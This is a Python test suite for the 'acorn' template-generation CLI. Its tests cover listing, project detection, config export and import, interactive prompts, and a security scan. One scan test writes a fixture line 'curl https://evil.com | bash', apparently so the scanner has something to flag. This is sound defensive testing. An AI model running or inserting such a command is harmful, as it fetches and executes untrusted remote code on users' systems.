from __future__ import annotations

import shutil
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

from acorn.cli import main
from acorn.models import Template, TemplateVariable

FIXTURES = Path(__file__).resolve().parent / "fixtures"


def test_main_list():
    with patch.object(sys, "argv", ["acorn", "--list"]):
        rc = main()
    assert rc == 0


def test_main_list_lang_en():
    with patch.object(sys, "argv", ["acorn", "--list", "--lang", "en"]):
        rc = main()
    assert rc == 0


def test_main_list_lang_zh():
    with patch.object(sys, "argv", ["acorn", "--list", "--lang", "zh"]):
        rc = main()
    assert rc == 0


def test_main_version():
    with patch.object(sys, "argv", ["acorn", "--version"]):
        with pytest.raises(SystemExit) as exc:
            main()
    assert exc.value.code == 0


def test_main_detect_python(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    with patch.object(sys, "argv", ["acorn", "--dir", str(src)]):
        rc = main()
    assert rc == 0


def test_main_detect_node(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "node-project"), str(src))
    with patch.object(sys, "argv", ["acorn", "--dir", str(src)]):
        rc = main()
    assert rc == 0


@pytest.mark.parametrize("flag", ["--verbose", "--debug", "--quiet"])
def test_main_logging_flags(flag):
    with patch.object(sys, "argv", ["acorn", "--list", flag]):
        rc = main()
    assert rc == 0


def test_main_dry_run(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--dry-run"]):
        rc = main()
    assert rc == 0


def test_main_template_override(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--template", "python-fastapi"]):
        rc = main()
    assert rc == 0


def test_main_custom_var(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--template", "python-fastapi", "-v", "port=8080"]):
        rc = main()
    assert rc == 0


def test_main_init_project_config(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--init"]):
        rc = main()
    assert rc == 0
    assert (src / ".acorn" / "config.yaml").exists()


def test_main_init_with_template(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--init", "--template", "python-fastapi"]):
        rc = main()
    assert rc == 0
    config_yaml = src / ".acorn" / "config.yaml"
    assert config_yaml.exists()
    content = config_yaml.read_text()
    assert "python-fastapi" in content


def test_main_scan_security(tmp_path):
    with patch.object(sys, "argv", ["acorn", "--scan", str(FIXTURES / "unsafe-project")]):
        rc = main()
    assert rc == 0


def test_main_scan_nonexistent(tmp_path):
    with patch.object(sys, "argv", ["acorn", "--scan", str(tmp_path / "nope")]):
        rc = main()
    assert rc != 0


def test_main_export_default(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / ".acorn").mkdir()
    (src / ".acorn" / "config.yaml").write_text("template: python-fastapi\n")

    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--export"]):
        rc = main()
    assert rc == 0
    assert (src / "acorn-export.yaml").exists()


def test_main_export_custom_path(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / ".acorn").mkdir()
    (src / ".acorn" / "config.yaml").write_text("template: node-api\n")
    out = tmp_path / "my-export.yaml"

    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--export", str(out)]):
        rc = main()
    assert rc == 0
    assert out.exists()


def test_main_import(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    export_file = tmp_path / "export.yaml"
    export_file.write_text("config:\n  template: python-fastapi\nlock: {}\n")

    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--import", str(export_file)]):
        rc = main()
    assert rc == 0
    assert (src / ".acorn" / "config.yaml").exists()


def test_main_import_missing_file(tmp_path):
    src = tmp_path / "project"
    src.mkdir()

    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--import", str(tmp_path / "nope.yaml")]):
        rc = main()
    assert rc != 0


def test_main_offline_check_update():
    with patch.object(sys, "argv", ["acorn", "--check-update", "--offline"]):
        rc = main()
    assert rc != 0


def test_main_empty_project_interactive(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="1"):
            rc = main()
    assert rc == 0


def test_main_add_template(tmp_path):
    template_dir = tmp_path / "my-cli-test-template"
    template_dir.mkdir()
    (template_dir / "template.yaml").write_text("name: my-cli-test-template\ndescription: Test\nversion: 1.0.0\nfiles: []\n")

    with patch("acorn.cli.TEMPLATES_DIR", tmp_path / "templates"):
        with patch.object(sys, "argv", ["acorn", "--add", str(template_dir)]):
            rc = main()
    assert rc == 0


def test_main_add_invalid_path():
    with patch.object(sys, "argv", ["acorn", "--add", "/nonexistent/path"]):
        rc = main()
    assert rc != 0


def test_main_remove_template(tmp_path):
    template_dir = tmp_path / "templates" / "test-tpl"
    template_dir.mkdir(parents=True)
    (template_dir / "template.yaml").write_text("name: test-tpl\n")

    with patch("acorn.cli.TEMPLATES_DIR", tmp_path / "templates"):
        with patch.object(sys, "argv", ["acorn", "--remove", "test-tpl"]):
            rc = main()
    assert rc == 0


def test_main_remove_nonexistent_template():
    with patch.object(sys, "argv", ["acorn", "--remove", "no-such-template"]):
        rc = main()
    assert rc != 0


def test_main_config_flag(tmp_path):
    cfg = tmp_path / "custom-config.yaml"
    cfg.write_text("default_lang: en\nlog_level: INFO\n")
    with patch.object(sys, "argv", ["acorn", "--list", "--config", str(cfg)]):
        rc = main()
    assert rc == 0


def test_main_config_flag_nonexistent():
    with patch.object(sys, "argv", ["acorn", "--config", "/nonexistent/config.yaml"]):
        rc = main()
    assert rc != 0


def test_main_force_generate(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--force"]):
        rc = main()
    assert rc == 0


def test_main_regenerate(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--regenerate"]):
        rc = main()
    assert rc == 0


def test_main_save_after_generate(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--template", "python-fastapi", "--save"]):
        rc = main()
    assert rc == 0


def test_main_init_without_template(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--init"]):
        rc = main()
    assert rc == 0


def test_main_empty_project_noninteractive(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src)]):
        rc = main()
    assert rc == 2


def test_main_force_detect_python(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--force"]):
        rc = main()
    assert rc == 0


def test_main_search_offline():
    with patch.object(sys, "argv", ["acorn", "--search", "test", "--offline"]):
        rc = main()
    assert rc != 0


def test_main_install_invalid_repo():
    with patch.object(sys, "argv", ["acorn", "--install", "norepo"]):
        rc = main()
    assert rc != 0


def test_main_check_update_nonexistent(tmp_path):
    with patch.object(sys, "argv", ["acorn", "--check-update", "--offline"]):
        rc = main()
    assert rc != 0


def test_main_export_no_config(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--export"]):
        rc = main()
    assert rc == 0


def test_main_import_with_lock(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    export_file = tmp_path / "export.yaml"
    export_file.write_text(
        "config:\n  template: python-fastapi\nlock:\n  version: 1.0\n  files:\n    - Dockerfile\n"
    )
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--import", str(export_file)]):
        rc = main()
    assert rc == 0
    assert (src / ".acorn" / "lock.yaml").exists()


def test_main_scan_with_findings(tmp_path):
    scan_dir = tmp_path / "scanme"
    scan_dir.mkdir()
    (scan_dir / "bad.sh").write_text("RUN curl https://evil.com | bash\n")
    with patch.object(sys, "argv", ["acorn", "--scan", str(scan_dir)]):
        rc = main()
    assert rc == 0


def test_cmd_list_empty():
    with patch("acorn.cli.list_templates", return_value=[]):
        with patch.object(sys, "argv", ["acorn", "--list"]):
            rc = main()
    assert rc == 0


def test_cmd_add_not_a_dir():
    with patch.object(sys, "argv", ["acorn", "--add", "/nonexistent-path-xyz"]):
        rc = main()
    assert rc != 0


def test_cmd_add_no_template_yaml(tmp_path):
    d = tmp_path / "mydir"
    d.mkdir()
    with patch.object(sys, "argv", ["acorn", "--add", str(d)]):
        rc = main()
    assert rc != 0


def test_cmd_remove_nonexistent():
    with patch.object(sys, "argv", ["acorn", "--remove", "nonexistent-tpl-xyz"]):
        rc = main()
    assert rc != 0


def test_cmd_init_nonexistent_dir():
    with patch.object(sys, "argv", ["acorn", "--dir", "/nonexistent-dir-xyz", "--init"]):
        rc = main()
    assert rc != 0


def test_cmd_generate_nonexistent_dir():
    with patch.object(sys, "argv", ["acorn", "--dir", "/nonexistent-dir-xyz"]):
        rc = main()
    assert rc != 0


def test_main_empty_project_interactive_auto(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="a"):
            rc = main()
    assert rc == 0


def test_main_empty_project_interactive_eof(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", side_effect=EOFError):
            rc = main()
    assert rc == 0


def test_main_interactive_confirm_reject_then_select(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    inputs = iter(["n", "1", "", ""])
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", side_effect=inputs):
            rc = main()
    assert rc == 0


def test_main_interactive_confirm_reject_then_skip(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", side_effect=["n", "", "", ""]):
            rc = main()
    assert rc == 0


def test_main_interactive_no_match_select(tmp_path):
    src = tmp_path / "project"
    src.mkdir(parents=True)
    (src / "random.txt").write_text("data")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="1"):
            rc = main()
    assert rc == 0


def test_main_interactive_no_match_auto(tmp_path):
    src = tmp_path / "project"
    src.mkdir(parents=True)
    (src / "random.txt").write_text("data")
    (src / "another.txt").write_text("more data")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="a"):
            rc = main()
    assert rc == 0


def test_main_interactive_no_match_skip(tmp_path):
    src = tmp_path / "project"
    src.mkdir(parents=True)
    (src / "random.txt").write_text("data")
    (src / "another.txt").write_text("more data")
    (src / "third.txt").write_text("even more")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="s"):
            rc = main()
    assert rc == 2


def test_main_interactive_no_match_eof(tmp_path):
    src = tmp_path / "project"
    src.mkdir(parents=True)
    (src / "random.txt").write_text("data")
    (src / "another.txt").write_text("more data")
    (src / "third.txt").write_text("even more")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", side_effect=EOFError):
            rc = main()
    assert rc == 2


def test_main_search_with_results():
    mock_results = [
        {"full_name": "user/tpl", "description": "A template", "stars": 42, "url": "", "updated_at": "", "name": "tpl"},
    ]
    with patch("acorn.cli.search_all", return_value=mock_results):
        with patch.object(sys, "argv", ["acorn", "--search", "test"]):
            rc = main()
    assert rc == 0


def test_main_search_with_results_no_description():
    mock_results = [
        {"full_name": "user/tpl", "description": "", "stars": 0, "url": "", "updated_at": "", "name": "tpl"},
    ]
    with patch("acorn.cli.search_all", return_value=mock_results):
        with patch.object(sys, "argv", ["acorn", "--search", "test"]):
            rc = main()
    assert rc == 0


def test_main_search_no_results():
    with patch("acorn.cli.search_all", return_value=[]):
        with patch("acorn.cli.search_github", return_value=[]):
            with patch.object(sys, "argv", ["acorn", "--search", "test"]):
                rc = main()
    assert rc == 2


def test_main_install_offline():
    with patch.object(sys, "argv", ["acorn", "--install", "user/repo", "--offline"]):
        rc = main()
    assert rc != 0


def test_main_mixed_project_out_of_range_selection(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "package.json").write_text("{}")
    (src / "requirements.txt").write_text("")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="99"):
            rc = main()
    assert rc in (0, 2)


def test_main_mixed_project_noninteractive(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "package.json").write_text("{}")
    (src / "requirements.txt").write_text("")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src)]):
        rc = main()
    assert rc in (0, 2)


def test_main_interactive_mixed_project_selection(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "package.json").write_text("{}")
    (src / "requirements.txt").write_text("")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="1"):
            rc = main()
    assert rc == 0


def test_main_interactive_mixed_project_eof(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "package.json").write_text("{}")
    (src / "requirements.txt").write_text("")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", side_effect=EOFError):
            rc = main()
    assert rc in (0, 2)


def test_main_confirm_default_no(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="y"):
            rc = main()
    assert rc == 0


def test_main_export_project_config(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / ".acorn").mkdir()
    (src / ".acorn" / "config.yaml").write_text("template: node-api\n")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--export", str(tmp_path / "out.yaml")]):
        rc = main()
    assert rc == 0


def test_main_check_update_offline():
    with patch.object(sys, "argv", ["acorn", "--check-update", "--offline"]):
        rc = main()
    assert rc != 0


def test_main_add_template_already_exists(tmp_path):
    template_dir = tmp_path / "dup-template"
    template_dir.mkdir()
    (template_dir / "template.yaml").write_text("name: dup\ndescription: x\nversion: 1.0\nfiles: []\n")
    dest = tmp_path / "global" / "dup-template"
    dest.mkdir(parents=True)
    with patch("acorn.cli.TEMPLATES_DIR", tmp_path / "global"):
        with patch.object(sys, "argv", ["acorn", "--add", str(template_dir)]):
            rc = main()
    assert rc != 0


def test_main_install_success():
    with patch("acorn.cli.install_from_github", return_value=True):
        with patch.object(sys, "argv", ["acorn", "--install", "user/repo"]):
            rc = main()
    assert rc == 0


def test_main_install_failure():
    with patch("acorn.cli.install_from_github", return_value=None):
        with patch.object(sys, "argv", ["acorn", "--install", "user/repo"]):
            rc = main()
    assert rc != 0


def test_main_var_without_equal(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--template", "python-fastapi", "-v", "badinput"]):
        rc = main()
    assert rc == 0


def test_main_project_config_template(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    config_dir = src / ".acorn"
    config_dir.mkdir()
    (config_dir / "config.yaml").write_text("template: python-fastapi\n")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src)]):
        rc = main()
    assert rc == 0


def test_main_empty_project_out_of_range_digit(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="99"):
            rc = main()
    assert rc == 0


def test_main_template_dry_run(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--template", "python-fastapi", "--dry-run"]):
        rc = main()
    assert rc == 0


def test_main_check_update_failure():
    with patch("acorn.cli.check_pypi_version", return_value=None):
        with patch.object(sys, "argv", ["acorn", "--check-update"]):
            rc = main()
    assert rc != 0


def test_main_empty_project_digit_selection(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="1"):
            rc = main()
    assert rc == 0


def test_main_detected_port_printing(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "package.json").write_text("{}")
    (src / "server.js").write_text("app.listen(7777)")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src)]):
        rc = main()
    assert rc == 0


def test_main_unknown_detection(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    with patch.object(sys, "argv", ["acorn", "--dir", str(src)]):
        rc = main()
    assert rc == 2


def test_main_interactive_confirm_reject_digit_select(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    inputs = iter(["1", "n", "1", "", ""])
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", side_effect=inputs):
            rc = main()
    assert rc == 0


def test_main_interactive_reject_then_select_digit(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    mock_tpl = Template(
        name="mock-tpl",
        description="test",
        project_type="node",
        path=Path("/tmp"),
        version="1.0.0",
        files=[],
        variables=[
            TemplateVariable(name="port", default="3000"),
        ],
    )
    inputs = iter(["1", "n", "1", ""])
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("acorn.cli.load_templates", return_value=[mock_tpl]):
            with patch("builtins.input", side_effect=inputs):
                rc = main()
    assert rc == 0


def test_main_save_after_matched_template(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--save"]):
        rc = main()
    assert rc == 0


def test_main_no_match_noninteractive(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "unknown.file").write_text("data")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src)]):
        rc = main()
    assert rc == 2


def test_main_no_match_noninteractive_nonempty(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "unknown.file").write_text("data")
    (src / "unknown2.file").write_text("more")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src)]):
        rc = main()
    assert rc == 2


def test_main_check_update_available():
    mock_result = {"current": "0.1.0", "latest": "99.99.99", "upgrade_available": True, "url": "https://pypi.org/project/acorn/"}
    with patch("acorn.cli.check_pypi_version", return_value=mock_result):
        with patch.object(sys, "argv", ["acorn", "--check-update"]):
            rc = main()
    assert rc == 0


def test_main_check_update_current():
    mock_result = {"current": "0.1.0", "latest": "0.1.0", "upgrade_available": False, "url": "https://pypi.org/project/acorn/"}
    with patch("acorn.cli.check_pypi_version", return_value=mock_result):
        with patch.object(sys, "argv", ["acorn", "--check-update"]):
            rc = main()
    assert rc == 0


def test_main_scan_no_findings(tmp_path):
    scan_dir = tmp_path / "safe"
    scan_dir.mkdir()
    (scan_dir / "readme.txt").write_text("safe content")
    with patch.object(sys, "argv", ["acorn", "--scan", str(scan_dir)]):
        rc = main()
    assert rc == 0


def test_main_confirm_default_no_no(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="no"):
            rc = main()
    assert rc == 0


def test_confirm_or_exit_default_yes_yes(tmp_path):
    from acorn.cli import _confirm_or_exit
    with patch("builtins.input", return_value="y"):
        assert _confirm_or_exit("Test?", default_yes=True) is True


def test_confirm_or_exit_default_no_yes(tmp_path):
    from acorn.cli import _confirm_or_exit
    with patch("builtins.input", return_value="y"):
        assert _confirm_or_exit("Test?", default_yes=False) is True


def test_confirm_or_exit_default_no_no(tmp_path):
    from acorn.cli import _confirm_or_exit
    with patch("builtins.input", return_value="n"):
        assert _confirm_or_exit("Test?", default_yes=False) is False


def test_confirm_or_exit_default_no_invalid(tmp_path):
    from acorn.cli import _confirm_or_exit
    with patch("builtins.input", return_value="invalid"):
        assert _confirm_or_exit("Test?", default_yes=False) is False


def test_main_project_config_template_dry_run(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "random.txt").write_text("something")
    (src / "another.txt").write_text("else")
    config_dir = src / ".acorn"
    config_dir.mkdir()
    (config_dir / "config.yaml").write_text("template: node-api\n")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--dry-run"]):
        rc = main()
    assert rc == 0


def test_main_detected_no_matched_template(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "Cargo.toml").write_text("[package]\nname = \"test\"\n")
    (src / "src").mkdir()
    (src / "src" / "main.rs").write_text("fn main() {}")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src)]):
        rc = main()
    assert rc == 0


def test_main_interactive_confirm_reject_eof(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    inputs = iter(["n", EOFError(""), "", "", "", ""])
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", side_effect=inputs):
            rc = main()
    assert rc == 0


def test_main_interactive_no_match_digit_select(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "random.txt").write_text("data")
    (src / "another.txt").write_text("more data")
    inputs = iter(["1", "", "", "", ""])
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", side_effect=inputs):
            rc = main()
    assert rc == 0


def test_main_interactive_reject_then_out_of_range_digit(tmp_path):
    src = tmp_path / "project"
    shutil.copytree(str(FIXTURES / "python-project"), str(src))
    mock_tpl = Template(name="only-one", description="test", project_type="node", files=[])
    inputs = iter(["1", "n", "2", "", ""])
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("acorn.cli.load_templates", return_value=[mock_tpl]):
            with patch("builtins.input", side_effect=inputs):
                rc = main()
    assert rc == 0


def test_main_interactive_no_match_out_of_range(tmp_path):
    src = tmp_path / "project"
    src.mkdir()
    (src / "random.txt").write_text("data")
    (src / "another.txt").write_text("more data")
    with patch.object(sys, "argv", ["acorn", "--dir", str(src), "--interactive"]):
        with patch("builtins.input", return_value="99"):
            rc = main()
    assert rc == 2


def test_main_module_runs():
    import subprocess
    result = subprocess.run(
        [sys.executable, "-m", "acorn", "--help"],
        capture_output=True, text=True,
    )
    assert result.returncode == 0


def test_main_module_entry():
    main_file = Path(__file__).resolve().parent.parent / "src" / "acorn" / "__main__.py"
    code = main_file.read_text()
    with patch.object(sys, "argv", ["acorn", "--help"]):
        with pytest.raises(SystemExit) as exc:
            exec(compile(code, str(main_file), "exec"), {"__name__": "__main__"})
    assert exc.value.code == 0


def test_cli_main_guard():
    cli_file = Path(__file__).resolve().parent.parent / "src" / "acorn" / "cli.py"
    code = cli_file.read_text()
    with patch.object(sys, "argv", ["acorn", "--help"]):
        with pytest.raises(SystemExit) as exc:
            exec(compile(code, str(cli_file), "exec"), {"__name__": "__main__"})
    assert exc.value.code == 0
